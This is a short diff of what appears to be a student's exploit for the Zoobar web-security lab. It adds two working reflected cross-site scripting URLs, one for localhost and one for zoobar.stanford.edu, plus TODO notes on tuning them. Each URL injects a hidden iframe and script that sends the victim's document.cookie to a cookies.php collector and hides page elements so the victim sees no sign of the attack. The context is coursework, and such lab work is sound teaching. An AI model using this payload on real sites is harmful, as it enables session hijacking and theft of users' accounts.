@@ -1,4 +1,12 @@
+Localhost version:
+
 http://localhost/users.php?user=%22 size=10><iframe style="display:none" id='mlfr'></iframe><script>window.frames[0].location.replace("http://localhost/cookies.php?cookie="%2Bescape(document.cookie)); setTimeout(function(){document.getElementById("zoobars").style.display="none"; document.getElementById("baduser").style.display="none"},1)</script><input style="display:none" name="
+
+
+Zoobar.stanford.edu:
+
+http://zoobar.stanford.edu/users.php?user=%22 size=10><iframe style="display:none" id='mlfr'></iframe><script>window.frames[0].location.replace("http://zoobar.stanford.edu/cookies.php?cookie="%2Bescape(document.cookie)); setTimeout(function(){document.getElementById("zoobars").style.display="none"; document.getElementById("baduser").style.display="none"},1)</script><input style="display:none" name="
 
 // TODO: maybe let timeout be greater to avoid the two DOM deletion requests to fail
 // TODO: change hostnames to stanford.edu
+// TODO: sometimes document.cookie submits other extraneous cookies, is this ok or should I only pass the ZoobarLogin cookie?
